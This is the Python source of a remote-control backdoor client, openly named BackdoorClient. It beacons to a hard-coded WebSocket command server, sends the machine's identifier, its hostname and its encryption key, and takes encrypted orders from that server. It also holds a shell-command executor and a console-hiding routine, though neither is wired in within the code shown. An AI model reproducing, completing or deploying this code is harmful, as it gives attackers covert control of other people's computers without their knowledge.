#!/usr/bin/env python
# -*- coding: utf-8 -*-
import os
import chardet
import ctypes
import subprocess
import threading
import uuid
import json
import time
from base64 import b64decode, b64encode
from websocket import create_connection
from Crypto.Cipher import AES
__author__ = 'nekocode'


class BackdoorClient(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.SERVER_HOST = 'ws://192.168.10.3:8888'
        self.HOST_NAME = hostname()
        self.UUID = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))
        self.IV = '\0' * AES.block_size
        self.SECRET = os.urandom(32)
        self.ws = None

        self.daemon = True
        self.start()

    def run(self):
        while True:
            try:
                self.ws = create_connection(self.SERVER_HOST)

                sercret_msg = {'uuid': self.UUID, 'host_name': self.HOST_NAME, 'secret': b64encode(self.SECRET)}
                self.ws.send(json.dumps(sercret_msg))

                time.sleep(1)

                while True:
                    msg = json.loads(self.decrypt(self.ws.recv()))
                    if 'cmd' in msg:
                        command = msg['cmd']

                        if command == 'dialog':
                            ShowDialog(msg, self)

                self.ws.close()

            except Exception as e:
                print e.message
                if self.ws:
                    self.ws.close()
                time.sleep(3)

    def send_msg(self, data):
        self.ws.send(self.encrypt(json.dumps({'data': data})))

    def encrypt(self, text):
        encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        ciphertext = encryptor.encrypt(text)
        return b64encode(ciphertext)

    def decrypt(self, ciphertext):
        decryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        plain = decryptor.decrypt(b64decode(ciphertext))
        return plain


class ExecCmd(threading.Thread):
    def __init__(self, command):
        threading.Thread.__init__(self)
        self.command = command

        self.daemon = True
        self.start()

    def run(self):
        try:
            proc = subprocess.Popen(self.command, shell=True,
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout_value = proc.stdout.read()
            stdout_value += proc.stderr.read()

        except Exception as e:
            pass


class ShowDialog(threading.Thread):
    def __init__(self, msg, client):
        threading.Thread.__init__(self)
        self.content = decode2utf(b64decode(msg['content']))
        print self.content
        self.msg = msg
        self.title = None if not msg['title'] else decode2utf(b64decode(msg['title']))
        if not self.title:
            self.title = u''

        self.client = client

        self.daemon = True
        self.start()

    def run(self):
        ctypes.windll.user32.MessageBoxW(None, self.content, self.title, 0)
        to_send_msg = {'to': self.msg['from'], 'jobid': self.msg['jobid'], 'rlt': 'OK'}
        self.client.ws.send(self.client.encrypt(json.dumps(to_send_msg)))


def decode2utf(rawstr):
    if chardet.detect(rawstr)['encoding'] != 'ascii':
        return rawstr.decode('gbk')
    else:
        return rawstr.decode('ascii')


def hostname():
    sys = os.name

    if sys == 'nt':
        return os.getenv('computername')
    elif sys == 'posix':
        host = os.popen('echo $HOSTNAME')
        try:
            name = host.read()
            return name
        finally:
            host.close()
    else:
        return 'Unknow hostname'


def hide_cmd_window():
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd != 0:
        ctypes.windll.user32.ShowWindow(whnd, 0)
        ctypes.windll.kernel32.CloseHandle(whnd)

if __name__ == '__main__':
    BackdoorClient()
    while True:
        time.sleep(10)



